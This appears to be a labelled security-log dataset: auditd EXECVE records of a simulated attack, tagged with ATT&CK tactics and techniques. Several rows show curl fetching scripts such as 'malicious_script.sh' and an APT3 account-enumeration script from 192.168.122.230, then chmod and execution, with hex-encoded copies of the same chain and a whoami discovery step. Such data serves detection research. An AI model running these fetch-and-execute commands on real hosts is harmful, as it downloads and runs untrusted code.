@timestamp,a0,a1,a10,a2,a3,a4,a5,a6,a7,a8,a9,command_executed,event.original,host.name,message,sequence,tactic,technique
"Sep 27, 2024 @ 15:05:53.506",curl,#NAME?,-,/tmp/malicious_script.sh,http://192.168.122.230:8080/malicious_script.sh,-,-,-,-,-,-,curl -o /tmp/malicious_script.sh http://192.168.122.230:8080/malicious_script.sh,"type=EXECVE msg=audit(1727449544.939:341287): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/malicious_script.sh"" a3=""http://192.168.122.230:8080/malicious_script.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449544.939:341287): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/malicious_script.sh"" a3=""http://192.168.122.230:8080/malicious_script.sh""",341287,execution,Command and Scripting Interpreter: Unix Shell
"Sep 27, 2024 @ 15:05:53.506",chmod,#NAME?,-,/tmp/malicious_script.sh,-,-,-,-,-,-,-,chmod +x /tmp/malicious_script.sh,"type=EXECVE msg=audit(1727449544.975:341289): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/malicious_script.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449544.975:341289): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/malicious_script.sh""",341289,execution,Command and Scripting Interpreter: Unix Shell
"Sep 27, 2024 @ 15:05:53.506",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449544.931:341285): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F6D616C6963696F75735F7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D616C6963696F75735F7363726970742E73683B2063686D6F64202B78202F746D702F6D616C6963696F75735F7363726970742E73683B202F746D702F6D616C6963696F75735F7363726970742E73683B273B",04472f17f8ed,"type=EXECVE msg=audit(1727449544.931:341285): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D6320276375726C202D6F202F746D702F6D616C6963696F75735F7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D616C6963696F75735F7363726970742E73683B2063686D6F64202B78202F746D702F6D616C6963696F75735F7363726970742E73683B202F746D702F6D616C6963696F75735F7363726970742E73683B273B",341285,-,-
"Sep 27, 2024 @ 15:05:53.506",/bin/bash,-c,-,-,-,-,-,-,-,-,-,/bin/bash -c,"type=EXECVE msg=audit(1727449544.935:341286): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F6D616C6963696F75735F7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D616C6963696F75735F7363726970742E73683B2063686D6F64202B78202F746D702F6D616C6963696F75735F7363726970742E73683B202F746D702F6D616C6963696F75735F7363726970742E73683B",04472f17f8ed,"type=EXECVE msg=audit(1727449544.935:341286): argc=3 a0=""/bin/bash"" a1=""-c"" a2=6375726C202D6F202F746D702F6D616C6963696F75735F7363726970742E736820687474703A2F2F3139322E3136382E3132322E3233303A383038302F6D616C6963696F75735F7363726970742E73683B2063686D6F64202B78202F746D702F6D616C6963696F75735F7363726970742E73683B202F746D702F6D616C6963696F75735F7363726970742E73683B",341286,-,-
"Sep 27, 2024 @ 15:05:53.507",/bin/bash,/tmp/malicious_script.sh,-,-,-,-,-,-,-,-,-,/bin/bash /tmp/malicious_script.sh,"type=EXECVE msg=audit(1727449544.979:341291): argc=2 a0=""/bin/bash"" a1=""/tmp/malicious_script.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449544.979:341291): argc=2 a0=""/bin/bash"" a1=""/tmp/malicious_script.sh""",341291,execution,Command and Scripting Interpreter: Unix Shell
"Sep 27, 2024 @ 15:06:28.511",sh,-c,-,-,-,-,-,-,-,-,-,sh -c,"type=EXECVE msg=audit(1727449581.959:341293): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D63202777686F616D6927",04472f17f8ed,"type=EXECVE msg=audit(1727449581.959:341293): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F62617368202D63202777686F616D6927",341293,-,-
"Sep 27, 2024 @ 15:06:28.512", ,-,-,-,-,-,-,-,-,-,-,whoami,"type=EXECVE msg=audit(1727449581.967:341295): argc=1 a0=""whoami""",04472f17f8ed,"type=EXECVE msg=audit(1727449581.967:341295): argc=1 a0=""whoami""",341295,discovery,System Owner/User Discovery
"Sep 27, 2024 @ 15:06:28.512",/bin/bash,-c,-,whoami,-,-,-,-,-,-,-,/bin/bash -c whoami,"type=EXECVE msg=audit(1727449581.963:341294): argc=3 a0=""/bin/bash"" a1=""-c"" a2=""whoami""",04472f17f8ed,"type=EXECVE msg=audit(1727449581.963:341294): argc=3 a0=""/bin/bash"" a1=""-c"" a2=""whoami""",341294,discovery,System Owner/User Discovery
"Sep 27, 2024 @ 15:06:53.516",/usr/bin/python3,/usr/lib/update-notifier/package-data-downloader,-,-,-,-,-,-,-,-,-,/usr/bin/python3 /usr/lib/update-notifier/package-data-downloader,"type=EXECVE msg=audit(1727449612.114:341296): argc=2 a0=""/usr/bin/python3"" a1=""/usr/lib/update-notifier/package-data-downloader""",04472f17f8ed,"type=EXECVE msg=audit(1727449612.114:341296): argc=2 a0=""/usr/bin/python3"" a1=""/usr/lib/update-notifier/package-data-downloader""",341296,-,-
"Sep 27, 2024 @ 15:07:28.519",curl,#NAME?,-,/tmp/enumerate-accounts.sh,http://192.168.122.230:8080/apt3-t1087.001.sh,-,-,-,-,-,-,curl -o /tmp/enumerate-accounts.sh http://192.168.122.230:8080/apt3-t1087.001.sh,"type=EXECVE msg=audit(1727449647.974:341301): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/enumerate-accounts.sh"" a3=""http://192.168.122.230:8080/apt3-t1087.001.sh""",04472f17f8ed,"type=EXECVE msg=audit(1727449647.974:341301): argc=4 a0=""curl"" a1=""-o"" a2=""/tmp/enumerate-accounts.sh"" a3=""http://192.168.122.230:8080/apt3-t1087.001.sh""",341301,discovery,Account Discovery: Local Account
